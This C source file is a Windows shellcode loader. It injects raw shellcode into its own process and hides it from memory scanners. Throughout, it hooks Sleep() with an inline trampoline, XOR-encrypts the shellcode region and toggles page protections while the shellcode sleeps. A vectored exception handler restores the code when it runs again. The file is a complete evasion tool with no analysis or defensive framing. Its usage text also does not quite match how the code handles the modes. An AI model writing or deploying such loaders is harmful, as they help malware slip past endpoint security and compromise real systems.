#include "header.h"

static inline UPTR get_return_address(void)
{
    #ifdef _WIN64
    return (UPTR)__builtin_return_address(0);
    #else
    /* 32 bits – también funciona */
    return (UPTR)__builtin_return_address(0);
    #endif
}
/* ------------- globales ------------- */
HookedSleep        g_hookedSleep;
FluctuationMetadata g_fluctuationData;
TypeOfFluctuation   g_fluctuate;

/* ------------- hook --------------- */
static void WINAPI MySleep(DWORD ms)
{
    LPVOID caller = (LPVOID)get_return_address();

    initializeShellcodeFluctuation(caller);
    shellcodeEncryptDecrypt(caller);

    log("[>] MySleep(%lu)", ms);

    HookTrampolineBuffers b = {0};
    b.originalBytes     = g_hookedSleep.sleepStub;
    b.originalBytesSize = sizeof(g_hookedSleep.sleepStub);

    /* des-hook temporal */
    fastTrampoline(false, (BYTE*)Sleep, (LPVOID)MySleep, &b);
    Sleep(ms);

    if (g_fluctuate == FluctuateToRW)
        shellcodeEncryptDecrypt(caller);

    /* re-hook */
    fastTrampoline(true,  (BYTE*)Sleep, (LPVOID)MySleep, NULL);
}

/* ------------- trampolín ----------- */
bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)
{
    BYTE trampo32[] = {
        0xB8,0,0,0,0,        /* mov eax, imm32 */
        0xFF,0xE0            /* jmp eax        */
    };
    BYTE trampo64[] = {
        0x49,0xBA,0,0,0,0,0,0,0,0, /* mov r10, imm64 */
        0x41,0xFF,0xE2              /* jmp r10         */
    };

    BYTE *code;
    DWORD size;
#ifdef _WIN64
    code = trampo64;
    size = sizeof(trampo64);
    memcpy(code+2, &jump, 8);
#else
    code = trampo32;
    size = sizeof(trampo32);
    uint32_t j32 = (uint32_t)(UPTR)jump;
    memcpy(code+1, &j32, 4);
#endif

    DWORD old;
    if (!VirtualProtect(target, size, PAGE_EXECUTE_READWRITE, &old))
        return false;

    if (install) {
        if (b && b->previousBytes) {
            memcpy(b->previousBytes, target, size);
            b->previousBytesSize = size;
        }
        memcpy(target, code, size);
    } else {
        if (!b || !b->originalBytes) return false;
        memcpy(target, b->originalBytes, b->originalBytesSize);
        size = b->originalBytesSize;
    }

    typeNtFlushInstructionCache fn;
    fn = (typeNtFlushInstructionCache)GetProcAddress(GetModuleHandleA("ntdll"),
                                                     "NtFlushInstructionCache");
    if (fn) fn(GetCurrentProcess(), target, size);

    VirtualProtect(target, size, old, &old);
    return true;
}

/* ------------- xor 32 -------------- */
void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)
{
    SIZE_T i;
    uint32_t *p = (uint32_t*)buf;
    for (i = 0; i < sz/4; ++i) p[i] ^= key;
    for (i = (sz&~3); i < sz; ++i) buf[i] ^= (uint8_t)(key & 0xFF);
}

/* ------------- memoria -------------- */
static uint8_t* g_memMap = NULL;
static SIZE_T   g_memCount = 0;

static void collectMemPriv(void)
{
    if (g_memMap) free(g_memMap);
    g_memMap  = NULL;
    g_memCount= 0;

    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = 0;
    SIZE_T alloc = 0, used = 0;

    while (VirtualQuery(addr, &mbi, sizeof(mbi))) {
        if ( (mbi.Type==MEM_PRIVATE) &&
             (mbi.Protect & (PAGE_EXECUTE_READWRITE|PAGE_EXECUTE_READ|PAGE_READWRITE)) )
        {
            if (used == alloc) {
                alloc = alloc ? alloc*2 : 64;
                g_memMap = realloc(g_memMap, alloc * sizeof(mbi));
            }
            ((MEMORY_BASIC_INFORMATION*)g_memMap)[used++] = mbi;
        }
        addr = (LPBYTE)addr + mbi.RegionSize;
    }
    g_memCount = used;
}

/* ------------- shellcode init ------- */
void initializeShellcodeFluctuation(LPVOID caller)
{
    if (g_fluctuate==NoFluctuation ||
        g_fluctuationData.shellcodeAddr!=NULL ||
        !isShellcodeThread(caller))
        return;

    collectMemPriv();
    for (SIZE_T i=0;i<g_memCount;i++){
        MEMORY_BASIC_INFORMATION *m = &((MEMORY_BASIC_INFORMATION*)g_memMap)[i];
        UPTR c = (UPTR)caller;
        UPTR b = (UPTR)m->BaseAddress;
        if (c>=b && c<b+m->RegionSize){
            g_fluctuationData.shellcodeAddr = m->BaseAddress;
            g_fluctuationData.shellcodeSize = m->RegionSize;
            g_fluctuationData.currentlyEncrypted = false;
            g_fluctuationData.encodeKey = ((uint32_t)rand()<<16) ^ (uint32_t)rand();
            g_fluctuationData.protect    = PAGE_EXECUTE_READ;
            log("[+] Fluctuation ready: 0x%p  size=%zu  key=%08X",
                m->BaseAddress, m->RegionSize, g_fluctuationData.encodeKey);
            return;
        }
    }
    log("[!] Caller not found in MEM_PRIVATE RX/RWX – aborting");
    ExitProcess(0);
}

/* ------------- es thread shellcode? -- */
bool isShellcodeThread(LPVOID addr)
{
    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery(addr, &mbi, sizeof(mbi))) return false;
    if (mbi.Type!=MEM_PRIVATE) return false;
    DWORD want = (g_fluctuate==FluctuateToRW)?PAGE_READWRITE:PAGE_NOACCESS;
    return (mbi.Protect & (PAGE_EXECUTE_READ|PAGE_EXECUTE_READWRITE|want)) != 0;
}

/* ------------- fluctuación ----------- */
void shellcodeEncryptDecrypt(LPVOID caller)
{
    if (g_fluctuate==NoFluctuation ||
        !g_fluctuationData.shellcodeAddr ||
        !g_fluctuationData.shellcodeSize ||
        !isShellcodeThread(caller))
        return;

    DWORD old;
    if (!g_fluctuationData.currentlyEncrypted ||
        (g_fluctuationData.currentlyEncrypted && g_fluctuate==FluctuateToNA))
    {
        VirtualProtect(g_fluctuationData.shellcodeAddr,
                       g_fluctuationData.shellcodeSize,
                       PAGE_READWRITE, &old);
        log("[>] Flipped to RW");
    }

    log("%s",(g_fluctuationData.currentlyEncrypted?"[<] Decoding":"[>] Encoding"));
    xor32((uint8_t*)g_fluctuationData.shellcodeAddr,
          g_fluctuationData.shellcodeSize,
          g_fluctuationData.encodeKey);

    if (!g_fluctuationData.currentlyEncrypted && g_fluctuate==FluctuateToNA){
        VirtualProtect(g_fluctuationData.shellcodeAddr,
                       g_fluctuationData.shellcodeSize,
                       PAGE_NOACCESS, &old);
        log("[>] Flipped to NoAccess");
    } else if (g_fluctuationData.currentlyEncrypted){
        VirtualProtect(g_fluctuationData.shellcodeAddr,
                       g_fluctuationData.shellcodeSize,
                       g_fluctuationData.protect, &old);
        log("[<] Flipped back to RX");
    }
    g_fluctuationData.currentlyEncrypted = !g_fluctuationData.currentlyEncrypted;
}

/* ------------- VEH ------------------ */
LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)
{
    if (xp->ExceptionRecord->ExceptionCode!=0xC0000005)
        return EXCEPTION_CONTINUE_SEARCH;

#ifdef _WIN64
    UPTR ip = xp->ContextRecord->Rip;
#else
    UPTR ip = xp->ContextRecord->Eip;
#endif
    log("[.] AV at 0x%p", (void*)ip);

    UPTR base = (UPTR)g_fluctuationData.shellcodeAddr;
    UPTR end  = base + g_fluctuationData.shellcodeSize;
    if (ip>=base && ip<end){
        log("[+] Shellcode hit – restoring RX & decrypt");
        shellcodeEncryptDecrypt((LPVOID)ip);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

/* ------------- leer archivo --------- */
bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize)
{
    HANDLE h = CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,
                           OPEN_EXISTING,0,NULL);
    if (h==INVALID_HANDLE_VALUE) return false;
    DWORD sz = GetFileSize(h,NULL), rd;
    uint8_t *buf = malloc(sz);
    bool ok = ReadFile(h,buf,sz,&rd,NULL) && rd==sz;
    CloseHandle(h);
    if (ok) { *out=buf; *outSize=sz; } else free(buf);
    return ok;
}

/* ------------- inyectar ------------- */
static DWORD WINAPI runShellcode(LPVOID param)
{
    ((void(*)())param)();
    return 0;
}

bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread)
{
    void *mem = VirtualAlloc(NULL,scSize,MEM_COMMIT,PAGE_READWRITE);
    if (!mem) return false;
    memcpy(mem,sc,scSize);
    DWORD old;
    if (!VirtualProtect(mem,scSize,PAGE_EXECUTE_READ,&old)){
        VirtualFree(mem,0,MEM_RELEASE); return false;
    }
    *outThread = CreateThread(NULL,0,runShellcode,mem,0,NULL);
    return *outThread != NULL;
}

/* ------------- main ----------------- */
int main(int argc, char **argv)
{
    if (argc<3){
        log("Usage: %s <shellcode.raw> <mode>", argv[0]);
        log("  mode: -1  do not inject (infinite loop)");
        log("         0  inject, no hook");
        log("         1  inject + RW fluctuation");
        log("         2  inject + PAGE_NOACCESS fluctuation (ORCA666)");
        return 1;
    }
    g_fluctuate = (TypeOfFluctuation)atoi(argv[2]);

    uint8_t *sc; SIZE_T scSize;
    if (!readShellcode(argv[1],&sc,&scSize)){
        log("[!] Cannot read shellcode"); return 1;
    }

    if (g_fluctuate!=NoFluctuation){
        log("[.] Hooking Sleep…");
        /* copiar prologo original para poder des-hookar */
        memcpy(g_hookedSleep.sleepStub, (void*)Sleep, sizeof(g_hookedSleep.sleepStub));
        g_hookedSleep.origSleep = Sleep;
        if (!fastTrampoline(true,(BYTE*)Sleep,(LPVOID)MySleep,NULL)){
            log("[!] Hook failed"); return 1;
        }
    }

    if (g_fluctuate==NoFluctuation){
        log("[.] Infinite loop – PID %lu", GetCurrentProcessId());
        while (1) Sleep(1000);
    }

    if (g_fluctuate==FluctuateToNA){
        log("[.] Installing VEH for PAGE_NOACCESS");
        AddVectoredExceptionHandler(1,VEHHandler);
    }

    HANDLE thr;
    if (!injectShellcode(sc,scSize,&thr)){
        log("[!] Injection failed"); return 1;
    }
    log("[+] Shellcode running – PID %lu", GetCurrentProcessId());
    WaitForSingleObject(thr,INFINITE);
    return 0;
}
